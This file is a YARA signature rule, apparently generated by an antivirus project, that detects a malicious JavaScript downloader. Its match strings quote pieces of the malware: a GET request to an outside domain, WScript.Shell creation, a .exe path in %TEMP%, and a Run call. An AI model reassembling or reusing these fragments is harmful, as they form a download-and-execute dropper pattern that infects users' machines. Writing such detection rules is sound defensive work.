rule sig_20160330_8c1138c9e3a00ee42eca249f01eae275 {
  meta:
    description = "datamaliciousorder - file 20160330_8c1138c9e3a00ee42eca249f01eae275.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "e7cd52f1e2ef4caa073a6897429c43c15df966b2ca973e0415f0c99ac47544c2"

  strings:
    $s1  = "AR[HR](\"GET\", \"http://be-stlines-tore.com/u3rsap\", false);" fullword ascii
    $s2  = "var I = function B() {return WScript[WM](\"WScript\"+\".Shell\");}(), W = 11;" fullword ascii
    $s3  = "function ON(EB, CG){PL = PL * 1; return EB - CG;};" fullword ascii
    $s4  = "if (AR[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function ZR(){return KF + \"\";};" fullword ascii
    $s6  = "function U() {return I[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"xleeqZ2EzE.ex\" + \"e\";};" fullword ascii
    $s7  = "function QW() {return ((VC == true) && (VC == Z1)) ? 1 : PL;};" fullword ascii
    $s8  = "function P(J0){I[\"Run\"](J0, PL, PL);};" fullword ascii
    $s9  = "function Y()" fullword ascii
    $s10 = "function E(){return 22;};" fullword ascii
    $s11 = "function DD(){return WM;};" fullword ascii
    $s12 = "function J(Z) {var DH = (1, 2, 3, 4, 5, Z); return DH;};" fullword ascii
    $s13 = "return ON(LD, D);" fullword ascii
    $s14 = "}while (E0);" fullword ascii
    $s15 = "var ER = new this[\"Date\"]();" fullword ascii
    $s16 = "var Z1 = false;" fullword ascii
    $s17 = "var VC = false;" fullword ascii
    $s18 = "Z1 = true; " fullword ascii
    $s19 = "VC = true; " fullword ascii
    $s20 = "var YR = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}